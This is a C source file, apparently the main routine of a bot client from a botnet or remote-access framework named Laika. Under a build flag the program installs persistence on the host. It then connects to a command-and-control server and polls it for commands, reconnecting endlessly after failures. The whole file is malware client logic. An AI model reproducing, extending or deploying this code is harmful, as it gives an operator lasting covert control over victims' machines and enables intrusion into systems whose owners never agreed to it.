#include <stdio.h>

#include "lconfig.h"
#include "lerror.h"
#include "ltask.h"
#include "bot.h"
#include "shell.h"
#include "persist.h"

int main(int argv, char *argc[]) {
    struct sLaika_bot *bot;

#ifdef LAIKA_PERSISTENCE
    laikaB_markRunning();

    /* install persistence */
    laikaB_tryPersist();
    do {
#endif
        bot = laikaB_newBot();

        LAIKA_TRY
            /* connect to test CNC */
            laikaB_connectToCNC(bot, LAIKA_CNC_IP, LAIKA_CNC_PORT);

            /* while connection is still alive, poll bot */
            while (laikaS_isAlive((&bot->peer->sock))) {
                laikaB_poll(bot);
            }
        LAIKA_TRYEND

        /* bot was killed or it threw an error */
        laikaB_freeBot(bot);
#ifdef LAIKA_PERSISTENCE
        sleep(5);
    } while (1);

    laikaB_unmarkRunning();
#endif

    return 0;
}